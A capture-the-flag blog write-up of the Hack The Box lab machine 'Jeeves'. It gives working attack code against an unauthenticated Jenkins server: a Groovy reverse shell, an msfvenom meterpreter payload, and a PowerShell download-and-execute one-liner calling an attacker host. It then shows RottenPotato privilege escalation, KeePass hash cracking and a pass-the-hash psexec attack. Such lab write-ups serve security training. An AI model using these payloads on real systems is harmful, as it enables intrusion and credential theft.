---
layout: post
title: "Hack the Box - Jeeves Write up"
date: 2018-05-19
description: "Write up for the Hack the box Machine Jeeves."
categories: [write-up, hackthebox]
tags: [writeup, pentesting, hackthebox]
---

## Intro
!["Jeeves"](/assets/jeeves/1.png "Jeeves")

I honestly had a whole lot of fun with Jeeves. It had multiple ways of attacking/rooting it, while also being a very _realistic_ example of something that you would see the real world. It wasn't an extremely difficult box, but you definitely had to do a little research to be successful in successfully rooting it. Definitely adding `Jeeves` to my list of HTB favorites. 

## Tools Used 
- [Nmap](https://nmap.org/)
- Web Browser
- [Ncat](https://nmap.org/ncat/)
- [Dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) 
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- Powershell
- [GDSecurity Windows Privesc Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [John the Ripper](http://www.openwall.com/john/)

## Enumeration
### Inital Scanning 

Like with every box lets start off with an nmap scan on `Jeeves`(10.10.10.63)...

```
root@dastinia:~/htb/jeeves# nmap -T4 -sC -sV -n 10.10.10.63 -oA jeeves_initial_scan
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-16 08:57 EDT
Nmap scan report for 10.10.10.63
Host is up (0.15s latency).
Not shown: 996 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-05-16 13:58:08
|_  start_date: 2018-05-16 11:17:53

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.30 seconds
```

Small Note: IF you aren't extremely familiar with windows you can usually tell what version of Windows is running by the version of [IIS](https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions#Features) that's being displayed. As you can see it's `Microsoft IIS httpd 10.0` which means that this version of windows is likely `Windows Server 2016` or `Windows 10`. It's not 100% conclusive, but you can get an idea of what you are working with. 

A full port scan was ran in the background, but no additional ports/services were discovered.

### Enumerating Port 80

Visiting the webserver on port 80 gives us this throwback to the past with an `ask jeeves` search engine webpage.
![Ask Jeeves Search Engine]({{site.url}}/assets/images/htb/jeeves/2.png "Ask Jeeves Search Engine")

There's a search bar so I input all specicial charaters to see how the "application" parses it... 

![Fake Error Page Image]({{site.url}}/assets/images/htb/jeeves/3.png "Fake Error Page Image")

You are presented with the fake _"error page"_ above, which is just an image of an error page.





### Enumerating Port 50000 (Jetty/Jenkins)
Visting the application on port 50000 in a Web browers leads us to a _Jetty 404 Error_ page.

![Jetty Error Page]({{site.url}}/assets/images/htb/jeeves/4.png "Jetty Error Page")

Whenever I encounter an application that error message that looks fairly unique, I always copy & paste the error message into Google and see what happens. This technique is very underrated, google that shit.

![Google that Shit]({{site.url}}/assets/images/htb/jeeves/5.png "Google that Shit") 

We are seeing quite a few results for Jenkins, so there is a high probability that this server is running Jenkins as a service, and now we just have to discover it.

#### Dirbuster

Next step is to dirbuster everything to discover the jenkins dashboard path. I always use the `directory-list-2.3-medium.txt` which comes default in kali for most HTB boxes. 

![Dirbuster]({{site.url}}/assets/images/htb/jeeves/6.png "Dirbuster")

```
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Wed May 16 09:48:14 EDT 2018
--------------------------------

http://10.10.10.63:50000
--------------------------------
Directories found during testing:

Dirs found with a 200 response:

/askjeeves/
/askjeeves/people/
/askjeeves/about/
/askjeeves/log/
/askjeeves/computer/
/askjeeves/api/
/askjeeves/log/rss/
/askjeeves/api/xml/
/askjeeves/people/api/
/askjeeves/script/
/askjeeves/api/python/
/askjeeves/people/api/xml/
.... [TRUNCATED] ....
--------------------------------

```


It looks like `/askjeves/` seems to be the correct path for the Jenkins main dashboard, confirming our suspicions that Jenkins is the running service. 
![Jenkins Dashboard](https://i.imgur.com/uC2bI92.png "Jenkins Dashboard")

## Exploitation
### Exploiting Jenkins

Jenkins is pretty much code execution as a service, so exploiting it shouldn't be too much of a hassle. There are a few ways to shell this box so I'll try and cover the main paths. This particular jenkins server didn't require authentication to do actions against it which is a pretty big (but common) misconfiguration. 


#### Method 1: Jenkins Script Console 

Jenkins has a scripting console, which you can access by going to `Manage Jenkins` => `Script Console`

![Jenkins Script Console](https://i.imgur.com/xj7w5jO.png "Jenkins Script Console")

You can write scripts in the `Groovy Scripting Language`. I searched for `groovy script run command example` or if you just want to skip straight to the shell search `groovy script reverse shell` 

Testing to see if we have code execution...

```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'powershell.exe $PSVERSIONTABLE'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
Output:

![](https://i.imgur.com/1o04hYr.png)

We confirmed that we have code execution. Now lets shell it.

From my search of  `groovy script reverse shell`, I came across this [Github gist](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
-- change the `host` and `port` parameter to match your settings, and hit "Run" in the script console & you will get a reverse shell.

```groovy
String host="10.10.15.30";
int port=8282;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

_Getting Reverse shell via Jenkins Script Console_
```
root@dastinia:~/htb/jeeves# ncat -lnvp 8282
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8282
Ncat: Listening on 0.0.0.0:8282
Ncat: Connection from 10.10.10.63.
Ncat: Connection from 10.10.10.63:49723.
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

ERROR: Unable to get user claims information.
```

---------


#### Method 2: Build Job Exec Command

With Jenkins you can execute system commands as part of a deployment build job. The Jenkins server allowed anyone to do anything even to the anonymous user which means we can create a malicious deployment  & execute our code.

Steps:
1. Create new Build Job (`http://10.10.10.63:50000/askjeeves/view/all/newJob`) 
2. Select "FreeStyle Project'
3. Hit Ok 
4. Select "Build Enviroment"
5. Generate payload / put the code you want to execute as a build step
6. Hit Apply
7. Start Build

You can run any system commands you want in the predeployment step, I used a `msfvenom` payload just to validate that it's possible.

```bash
root@dastinia:~# msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.15.30 LPORT=8081 -f psh-cmd > 8081.cmd
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 588 bytes
Final size of psh-cmd file: 7111 bytes
```
![](https://i.imgur.com/sbVHY7I.png)

Hit Save & Apply 

```
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf exploit(multi/handler) > set LPORT 8081
LPORT => 8081
msf exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.

[*] Started HTTP reverse handler on http://10.10.15.30:8081
msf exploit(multi/handler) > jobs

Jobs
====

  Id  Name                    Payload                           Payload opts
  --  ----                    -------                           ------------
  1   Exploit: multi/handler  windows/meterpreter/reverse_tcp   tcp://10.10.15.30:8383
  2   Exploit: multi/handler  windows/meterpreter/reverse_http  http://10.10.15.30:8081

msf exploit(multi/handler) >
[*] http://10.10.15.30:8081 handling request from 10.10.10.63; (UUID: mwj6ua5f) Staging x86 payload (180825 bytes) ...
[*] Meterpreter session 2 opened (10.10.15.30:8081 -> 10.10.10.63:49761) at 2018-05-16 15:14:13 -0400
```
The session may die rapidly, so you may want to make it automigrate, but I prefer the groovy script method since it's easier. This just validates that you can do it this way if you choose.

## Privilege Escalation

Lets run the results of the `systeminfo` command through GDSSecurity [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester),and see if there are any potential exploits/LPE's we can utilize. This is usually one of the first steps I take when I get on a windows box because you can very quickly determine if you have a path to esclatate your privileges through an exploit, or if you have to discover another way. 

 

```
C:\Users\kohsuke\Desktop>systeminfo

Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00331-20304-47406-AA297
Original Install Date:     10/25/2017, 4:45:33 PM
System Boot Time:          5/16/2018, 2:45:50 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.0.B64.1704110547, 4/11/2017
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 873 MB
Virtual Memory: Max Size:  2,687 MB
Virtual Memory: Available: 1,293 MB
Virtual Memory: In Use:    1,394 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 10 Hotfix(s) Installed.
                           [01]: KB3150513
                           [02]: KB3161102
                           [03]: KB3172729
                           [04]: KB3173428
                           [05]: KB4021702
                           [06]: KB4022633
                           [07]: KB4033631
                           [08]: KB4035632
                           [09]: KB4051613
                           [10]: KB4041689
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.63
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed
```

![Windows Exploit Suggester Output](https://i.imgur.com/fu0dA0L.png "Windows Exploit Suggester Results")

It looks like this machine is vulnerable two a few LPE exploits the big ones being [MS16-075 (RottenPotato)](https://github.com/foxglovesec/RottenPotato) & [MS16-032](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc). From our `sysinfo` output we can rule out `MS16-032` because that particular exploit requires `two cpu(s)`, and this machine has only `one cpu.`

It looks like this machine is vulnerable to MS16-075 (which I would say is fairly reliable when available), and from our eariler `whoami /all` command it seems we have everything in place to successfully execute this exploit.




### Method 1: MS16-075 "RottenPotato" 


The steps to successfully exploit MS16-075 "rotten potato" (with meterpreter) is:
1. Have meterpreter shell
2. Upload RottenPotato/potato exploit executeable
3. Load ignognito on meterpreter session
4. Execute rottenpotato executable
5. Impersonate NT Authority/SYSTEM token
6. You are now system.


_Powershell 1-liner for download + executing file (getting meterpreter shell):_

```powershell
powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.30:9999/8383.exe','8383.exe')";Start-Process '8383.exe'
``` 

_On Jeeves Host_
```
C:\Users\Administrator\.jenkins>cd %appdata%

C:\Users\kohsuke\AppData\Roaming>powershell -exec bypass -c "(New-Object Net.WebClient).DownloadFile('http://10.10.15.30:9999/8383.exe','8383.exe')";Start-Process '8383.exe'

C:\Users\kohsuke\AppData\Roaming>
```
_Attack Box_

```
msf >
[*] Sending stage (179779 bytes) to 10.10.10.63
[*] Meterpreter session 4 opened (10.10.15.30:8383 -> 10.10.10.63:49682) at 2018-05-16 17:07:54 -0400

msf >
msf > sessions

Active sessions
===============
  Id  Name  Type                    Information              Connection  
  --  ----  ----                     -----------              ----------  
  2         meterpreter x86/windows                           10.10.15.30:8081 -> 10.10.10.63:49761 (10.10.10.63)  
  4         meterpreter x86/windows  JEEVES\kohsuke @ JEEVES  10.10.15.30:8383 -> 10.10.10.63:49682 (10.10.10.63)

```

_Completing the required steps for the exploit_

```
meterpreter > upload /opt/serve/windows/priv/rottenpotato.exe
[*] uploading  : /opt/serve/windows/priv/rottenpotato.exe -> rottenpotato.exe
[*] Uploaded 664.00 KiB of 664.00 KiB (100.0%): /opt/serve/windows/priv/rottenpotato.exe -> rottenpotato.exe
[*] uploaded   : /opt/serve/windows/priv/rottenpotato.exe -> rottenpotato.exe
meterpreter > getuid
Server username: JEEVES\kohsuke
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
JEEVES\kohsuke

Impersonation Tokens Available
========================================
No tokens available

meterpreter > execute -cH -f rottenpotato.exe
Process 3620 created.
Channel 2 created.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
JEEVES\kohsuke

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Method 2: Crack Keepass Database to Pass-the-hash

If you searched through the user `kohsuke` documents directory you would discover a file called `CEH.kbdx`. Normally the `.kbdx` file extension is associated with the [KeePass Password Safe](https://keepass.info/). If we can crack the password on this vault file, we will likely find credentials to potentially the local administrator account. 

_Downloading the Keepass Database file with meterpreter_
```
meterpreter > cd Documents
meterpreter > dir
Listing: C:\Users\kohsuke\Documents
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  2846  fil   2017-09-18 13:43:17 -0400  CEH.kdbx
40777/rwxrwxrwx   0     dir   2017-11-03 22:50:40 -0400  My Music
40777/rwxrwxrwx   0     dir   2017-11-03 22:50:40 -0400  My Pictures
40777/rwxrwxrwx   0     dir   2017-11-03 22:50:40 -0400  My Videos
100666/rw-rw-rw-  402   fil   2017-11-03 23:15:51 -0400  desktop.ini

meterpreter > download CEH.kdbx
[*] Downloading: CEH.kdbx -> CEH.kdbx
[*] Downloaded 2.78 KiB of 2.78 KiB (100.0%): CEH.kdbx -> CEH.kdbx
[*] download   : CEH.kdbx -> CEH.kdbx
meterpreter >
```
_verifying the downloaded file_
```
root@dastinia:~/htb/jeeves# file CEH.kdbx
CEH.kdbx: Keepass password database 2.x KDBX
```

Before we can crack the `CEH.kbdx` we need to convert it to a format that either `john` or `hashcat` can understand. We can use the tool `keepass2john` (comes preinstalled on kali) to do this.


```
root@dastinia:~/htb/jeeves# keepass2john CEH.kdbx
CEH:$keepass$*2*6000*222*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
root@dastinia:~/htb/jeeves# keepass2john CEH.kdbx > CEH.hash
```

_cracking the hash & getting the password of the vault with john_
```
root@dastinia:~/htb/jeeves# john --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:01:02 DONE (2018-05-16 23:54) 0.01601g/s 880.4p/s 880.4c/s 880.4C/s moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can then open this file with the Keepass utility, and the password we discovered with JTR. 

![Opening KeePass Database File](https://i.imgur.com/RYZ8yPc.png "Opening KeePass Database with cracked password -'moonshine1'")


Here are the contents that were contained in the keepass database file.

```
Password
12345
F7WhTrSFDKB6sxHU1cUn
pwndyouall!
lCEUnYPjNfIuPZSzOySA
S1TjAtJHKsugh9oC4VZl
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

We have a few passwords & and a hash `aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00` which happens to be an `NTLM` hash. The `SMB` Service (Port 445) is exposed on this server, so we can attempt to authenticate to the system using a password spray attack or a pass-the-hash attack.

I'm a pretty big fan of [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) as a tool, and I use it pretty frequently for my real life work as well.

Some CME syntax: `-p` is for a list of passwords, and `-H` is for a list of hashes. 

I used the `--lusers` flag to enumerate the logged on users just to validate that the credentials I used actually worked.


!["Credential & Hash Spraying with CrackMapExec")](https://i.imgur.com/W9jh3Sn.png "Credential & Hash Spraying with CrackMapExec")

##### Shell with Metasploit PSEXEC Module & Hash

With a valid hash of the administrator account, we can perform a pass-the-hash attack & compromise the machine. I chose to use Metasploit for this, but there are plenty of tools which do the same thing as this module.

_Getting SYSTEM shell with msf psexec_
```
msf > use exploit/windows/smb/psexec
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   RHOST                 10.10.10.63                                                        yes       The target address
   RPORT                 445                                                                yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                     no        The service display name
   SERVICE_NAME                                                                             no        The service name
   SHARE                 ADMIN$                                                             yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                                  no        The Windows domain to use for authentication
   SMBPass               aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00  no        The password for the specified username
   SMBUser               Administrator                                                      no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.15.30      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf exploit(windows/smb/psexec) > exploit -j -z
[*] Exploit running as background job 2.

[*] Started reverse TCP handler on 10.10.15.30:4444
[*] 10.10.10.63:445 - Connecting to the server...
[*] 10.10.10.63:445 - Authenticating to 10.10.10.63:445 as user 'Administrator'...
[*] 10.10.10.63:445 - Selecting PowerShell target
[*] 10.10.10.63:445 - Executing the payload...
[+] 10.10.10.63:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to 10.10.10.63
[*] Meterpreter session 3 opened (10.10.15.30:4444 -> 10.10.10.63:49686) at 2018-05-17 00:18:23 -0400
msf exploit(windows/smb/psexec) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

## Getting the "Hidden" root.txt

```
meterpreter > cat hm.txt
The flag is elsewhere.  Look deeper
```

We drop into a regular shell, and run a `dir /a` which will show all files with the "hidden" attribute set. 

```
C:\Users\Administrator\Desktop>dir /a

 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
11/03/2017  10:03 PM               282 desktop.ini
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               3 File(s)          1,115 bytes
               2 Dir(s)   7,032,709,120 bytes free

```

`dir /a` will already show all of the hidden files on the system so likely the file is being hidden by another means.

In windows the only way you can really hide files is either by setting the `hidden attribute` with an `attrib +h "whatever_thing_here"` or through something called an [Alternate Data Stream](https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/) which is an NTFS specific thing.

To see files with an alternate data stream do a `dir /R`

```
C:\Users\Administrator\Desktop>dir /R

 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,030,882,304 bytes free
```
That `hm.txt:root.txt:$DATA` means that the file `root.txt` is inside an alternate data stream inside `hm.txt` 
			   
You can see the contents of an ADS stream a few different ways but the simplist way in my opinion is using the `more` command on windows...

```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
...[FLAG REDACTED]...
```

Box Complete :) 

### References
https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password

http://www.labofapenetrationtester.com/2014/06/hacking-jenkins-servers.html

https://medium.com/@exgq/hacking-jenkins-68f7f6a810eb

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe

https://www.rubydevices.com.au/blog/how-to-hack-keepass

https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/